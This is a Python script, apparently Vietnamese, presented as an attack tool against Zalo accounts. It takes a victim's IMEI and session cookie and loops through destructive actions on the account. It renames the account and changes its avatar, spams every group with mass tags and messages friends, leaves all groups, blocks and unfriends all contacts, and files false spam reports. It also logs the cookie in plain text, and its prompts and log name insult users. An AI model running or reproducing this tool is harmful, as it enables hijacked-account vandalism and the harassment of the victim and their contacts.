import sys
import os
import random
import time
import json
import logging
from zlapi import ZaloAPI, ThreadType
from zlapi.models import *

# ANSI color codes for console output
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;37m"
end = '\033[0m'

ndp_tool = "\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> "
__VERSION__ = '2.0'
admin_cre = "nguyen hoang gia bao"
admin_zalo = "Zalo Admin 0988467271"
func_admin = "Tool attack account zalo"

# Set up logging
logging.basicConfig(
    filename='mấy thằng ngu lồn bị attack',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def banner():
    banner_text = f"""
{xduong}╔════════════════════════════════════════════════════════════════{end}
{vang}║▂▃▅▇█▓▒░{luc}HƯỚNG DẪN{vang}░▒▓█▇▅▃▂{end}
{vang}║➣ Nhập IMEI và cookie để sử dụng tool
{vang}║➣ Tool sẽ spam nhóm, bạn bè, rời nhóm, chặn và xóa bạn bè, spam report
{vang}║➣ Sau mỗi chu kỳ, tool sẽ nghỉ 5 giây
{vang}║➣ Nếu có lỗi, tool sẽ thử lại tối đa 3 lần
{xduong}╠
{vang}║▂▃▅▇█▓▒░{luc}THÔNG TIN TOOL{vang}░▒▓█▇▅▃▂{end}
{vang}║➣ Version: {luc}{__VERSION__}{end}
{vang}║➣ Author: {luc}{admin_cre}{end}
{vang}║➣ Function: {luc}{func_admin}{end}
{xduong}╚════════════════════════════════════════════════════════════════{end}
"""
    for char in banner_text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.00125)

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def get_device_info():
    while True:
        try:
            imei = input(f"{ndp_tool}Nhập IMEI: ")
            if not imei.strip():
                print(f"{do}Mày gà quá nhập lại đi.{end}")
                continue
            cookie_input = input(f"{ndp_tool}Nhập cookie đi thằng ngu (JSON format): ")
            cookie = json.loads(cookie_input)
            if "zpw_sek" not in cookie or not cookie["zpw_sek"]:
                print(f"{do}Cookie thiếu zpw_sek hoặc zpw_sek không hợp lệ! Vui lòng nhập lại.{end}")
                continue
            return imei, cookie
        except json.JSONDecodeError:
            print(f"{do}Định dạng cookie không hợp lệ! Nhập lại nhanh cho bố.{end}")
        except Exception as e:
            print(f"{do}Lỗi khi nhập thông tin: {e}{end}")

def get_random_images_from_folder(folder_path='./pha', count=1):
    try:
        if not os.path.exists(folder_path):
            print(f"{do}Thư mục {folder_path} không tồn tại!{end}")
            logging.error(f"Image folder {folder_path} does not exist")
            return None
        all_files = os.listdir(folder_path)
        image_files = [file for file in all_files if file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif'))]
        if not image_files:
            print(f"{do}Không tìm thấy ảnh trong thư mục {folder_path}!{end}")
            logging.error(f"No images found in folder {folder_path}")
            return None
        return [os.path.join(folder_path, random.choice(image_files)) for _ in range(min(count, len(image_files)))]
    except Exception as e:
        print(f"{do}Lỗi khi lấy ảnh: {e}{end}")
        logging.error(f"Error getting images: {e}")
        return None

def generate_random_name():
    first_names = ["Attack By"]
    last_names = ["iu em"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def check_api_response(response):
    if not response or response is None:
        print(f"{do}API không trả về dữ liệu.{end}")
        logging.error("API response is empty or None")
        return False
    return True

def spam_all_groups(client, tagall_message, image_paths=None, spam_count=30):
    try:
        groups = client.fetchAllGroups()
        if not check_api_response(groups) or 'gridVerMap' not in groups:
            print(f"{do}Không thể lấy danh sách nhóm.{end}")
            logging.error("Failed to fetch group list")
            return False

        group_ids = list(groups['gridVerMap'].keys())
        spammed_count = 0

        for thread_id in group_ids:
            if spammed_count >= spam_count:
                break

            group_info = client.fetchGroupInfo(thread_id).gridInfoMap[thread_id]
            members = group_info.get('memVerList', [])
            if not members:
                print(f"{do}Nhóm {thread_id} không có thành viên để tag.{end}")
                logging.warning(f"Group {thread_id} has no members")
                continue

            # Construct message with manual mentions
            text = f"<b>{tagall_message}</b> "
            for member in members:
                member_parts = member.split('_', 1)
                if len(member_parts) != 2:
                    continue
                user_id, user_name = member_parts
                text += f"@{user_name} "

            message = Message(
                text=text,
                style={"bold": True, "color": "red"}
            )

            if image_paths and all(os.path.exists(img) for img in image_paths):
                client.sendMultiLocalImage(
                    imagePathList=image_paths,
                    thread_id=thread_id,
                    thread_type=ThreadType.GROUP,
                    width=2560,
                    height=2560,
                    message=message,
                )
            else:
                client.sendMessage(
                    message=message,
                    thread_id=thread_id,
                    thread_type=ThreadType.GROUP
                )

            print(f"{luc}Đã gửi tin nhắn đến nhóm {thread_id}{end}")
            logging.info(f"Sent message to group {thread_id}")
            spammed_count += 1
            time.sleep(random.uniform(3, 5))  # Increased delay to avoid rate limits

        return True
    except Exception as e:
        print(f"{do}Lỗi khi spam nhóm: {e}{end}")
        logging.error(f"Error spamming groups: {e}")
        if "rate limit" in str(e).lower():
            print(f"{do}Đã vượt quá giới hạn API, nghỉ 60 giây...{end}")
            time.sleep(60)
        return False

def spam_all_friends(client, message_text, image_paths=None, spam_count=30):
    try:
        friends = client.fetchAllFriends()
        if not check_api_response(friends):
            print(f"{do}Không thể lấy danh sách bạn bè.{end}")
            logging.error("Failed to fetch friend list")
            return False

        spammed_count = 0
        for friend in friends[:spam_count]:
            thread_id = friend.get('userId')
            if not thread_id:
                continue

            message = Message(
                text=message_text,
                style={"bold": True, "color": "red"}
            )

            if image_paths and all(os.path.exists(img) for img in image_paths):
                client.sendMultiLocalImage(
                    imagePathList=image_paths,
                    thread_id=thread_id,
                    thread_type=ThreadType.USER,
                    width=2560,
                    height=2560,
                    message=message,
                )
            else:
                client.sendMessage(
                    message=message,
                    thread_id=thread_id,
                    thread_type=ThreadType.USER
                )

            print(f"{luc}Đã gửi tin nhắn đến bạn {thread_id}{end}")
            logging.info(f"Sent message to friend {thread_id}")
            spammed_count += 1
            time.sleep(random.uniform(3, 5))  # Increased delay

        return True
    except Exception as e:
        print(f"{do}Lỗi khi spam bạn bè: {e}{end}")
        logging.error(f"Error spamming friends: {e}")
        if "rate limit" in str(e).lower():
            print(f"{do}Đã vượt quá giới hạn API, nghỉ 60 giây...{end}")
            time.sleep(60)
        return False

def leave_all_groups(client, imei):
    try:
        groups = client.fetchAllGroups()
        if not check_api_response(groups) or 'gridVerMap' not in groups:
            print(f"{do}Không thể lấy danh sách nhóm để rời.{end}")
            logging.error("Failed to fetch group list for leaving")
            return

        for group_id in groups['gridVerMap'].keys():
            client.leaveGroup(group_id, imei=imei)
            print(f"{luc}Đã rời nhóm {group_id}{end}")
            logging.info(f"Left group {group_id}")
            time.sleep(2)  # Increased delay

    except Exception as e:
        print(f"{do}Lỗi khi rời nhóm: {e}{end}")
        logging.error(f"Error leaving groups: {e}")

def block_and_unfriend_all_friends(client):
    try:
        friends = client.fetchAllFriends()
        if not check_api_response(friends):
            print(f"{do}Không thể lấy danh sách bạn bè để chặn và xóa.{end}")
            logging.error("Failed to fetch friend list for blocking/unfriending")
            return

        for friend in friends:
            user_id = friend.get('userId')
            if user_id:
                client.blockUser(user_id)
                client.unfriendUser(user_id)
                print(f"{luc}Đã chặn và xóa bạn {user_id}{end}")
                logging.info(f"Blocked and unfriended {user_id}")
                time.sleep(2)  # Increased delay

    except Exception as e:
        print(f"{do}Lỗi khi chặn và xóa bạn bè: {e}{end}")
        logging.error(f"Error blocking/unfriending: {e}")

def spam_report(client, report_count=10):
    try:
        friends = client.fetchAllFriends()
        if not check_api_response(friends):
            print(f"{do}Không thể lấy danh sách bạn bè để report.{end}")
            logging.error("Failed to fetch friend list for reporting")
            return

        reported_count = 0
        for friend in friends[:report_count]:
            user_id = friend.get('userId')
            if user_id:
                client.sendReport(
                    target_id=user_id,
                    reason="Spam or harassment",
                    target_type="user"
                )
                print(f"{luc}Đã gửi report cho {user_id}{end}")
                logging.info(f"Reported user {user_id}")
                reported_count += 1
                time.sleep(2)  # Increased delay

    except Exception as e:
        print(f"{do}Lỗi khi spam report: {e}{end}")
        logging.error(f"Error sending reports: {e}")

def change_avatar(client, image_paths):
    try:
        if image_paths and all(os.path.exists(img) for img in image_paths):
            client.changeAccountAvatar(image_paths[0])
            print(f"{luc}Đã thay đổi avatar thành công{end}")
            logging.info("Changed avatar successfully")
        else:
            print(f"{do}Không tìm thấy ảnh để thay đổi avatar{end}")
            logging.error("No valid image for avatar change")
    except Exception as e:
        print(f"{do}Lỗi khi thay đổi avatar: {e}{end}")
        logging.error(f"Error changing avatar: {e}")
        if "zpw_sek" in str(e):
            print(f"{do}Kiểm tra lại cookie - zpw_sek có thể bị thiếu hoặc không đúng.{end}")
            logging.error("Invalid or missing zpw_sek in cookie")
            return False
        return False
    return True

def main():
    clear_screen()
    banner()

    imei, cookie = get_device_info()
    print(f"{vang}IMEI: {imei}{end}")
    print(f"{vang}Cookie: {json.dumps(cookie, indent=2)}{end}")
    logging.info(f"Using IMEI: {imei}, Cookie: {json.dumps(cookie)}")

    client = ZaloAPI('</>', '</>', imei=imei, session_cookies=cookie)
    
    try:
        profile = client.fetchAccountInfo().profile
        print(f"{luc}Đã xác thực tài khoản: {profile.get('displayName', 'Unknown')}{end}")
        logging.info(f"Authenticated account: {profile.get('displayName', 'Unknown')}")
    except Exception as e:
        print(f"{do}Không thể xác thực tài khoản: {e}{end}")
        print(f"{do}Vui lòng kiểm tra lại IMEI và cookie.{end}")
        logging.error(f"Authentication failed: {e}")
        return

    message_text = "Attack By Bố nguyen hoang gia bao"
    max_retries = 3

    while True:
        retry_count = 0
        try:
            image_paths = get_random_images_from_folder('./pha', count=3)
            if not change_avatar(client, image_paths):
                print(f"{do}Thất bại khi thay đổi avatar, bỏ qua bước này.{end}")
                logging.warning("Skipped avatar change due to failure")

            user = client.fetchAccountInfo().profile
            random_name = generate_random_name()
            client.changeAccountSetting(
                name=random_name,
                dob='2000-01-01',
                gender=int(user.get('gender', 1)),
                biz={}
            )
            print(f"{luc}Đã đổi tên thành: {random_name}{end}")
            logging.info(f"Changed name to: {random_name}")

            spam_all_groups(client, message_text, image_paths, spam_count=30)
            spam_all_friends(client, message_text, image_paths, spam_count=30)
            leave_all_groups(client, imei)
            block_and_unfriend_all_friends(client)
            spam_report(client, report_count=10)

            print(f"{luc}Hoàn thành một chu kỳ, nghỉ 5 giây...{end}")
            logging.info("Completed one cycle, resting for 5 seconds")
            time.sleep(5)
        except Exception as e:
            print(f"{do}Lỗi trong vòng lặp chính: {e}{end}")
            logging.error(f"Main loop error: {e}")
            if "zpw_sek" in str(e):
                print(f"{do}Session có thể đã hết hạn. Vui lòng lấy cookie mới và khởi động lại.{end}")
                logging.error("Session expired, zpw_sek error")
                break
            retry_count += 1
            if retry_count >= max_retries:
                print(f"{do}Đã vượt quá số lần thử lại ({max_retries}), thoát chương trình.{end}")
                logging.error(f"Exceeded max retries ({max_retries}), exiting")
                break
            print(f"{vang}Thử lại sau 5 giây... (Lần {retry_count}/{max_retries}){end}")
            logging.info(f"Retrying after 5 seconds, attempt {retry_count}/{max_retries}")
            time.sleep(5)

if __name__ == "__main__":
    main()